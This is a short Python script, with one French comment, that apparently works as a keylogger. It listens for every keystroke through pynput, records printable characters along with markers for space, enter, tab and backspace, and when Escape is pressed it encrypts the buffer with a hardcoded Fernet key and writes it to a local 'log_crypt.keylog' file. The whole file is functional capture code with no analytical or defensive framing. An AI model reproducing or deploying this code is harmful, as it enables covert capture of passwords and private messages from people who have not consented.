from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet

KEY = b'7L5R-u7r8nhekrEYlPufNqns56IoJprG9p0Cu4SXR6s='
log_data = ""

def encrypt_and_save(data):
    fernet = Fernet(KEY)
    encrypted_data = fernet.encrypt(data.encode())
    with open("log_crypt.keylog", "ab") as file:
        file.write(encrypted_data + b'\n')

def on_press(key):
    global log_data
    if hasattr(key, 'char') and key.char is not None:
        log_data += key.char
    else:
        # Pour les touches spéciales, on peut les ignorer ou les gérer séparément
        if key == Key.space:
            log_data += " "
        elif key == Key.enter:
            log_data += "\n"
        elif key == Key.tab:
            log_data += "[TAB]"
        elif key == Key.backspace:
            log_data += "[BACKSPACE]"
        # Ignorer les autres touches sans representation en char

def on_release(key):
    global log_data
    if key == Key.esc:
        encrypt_and_save(log_data)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
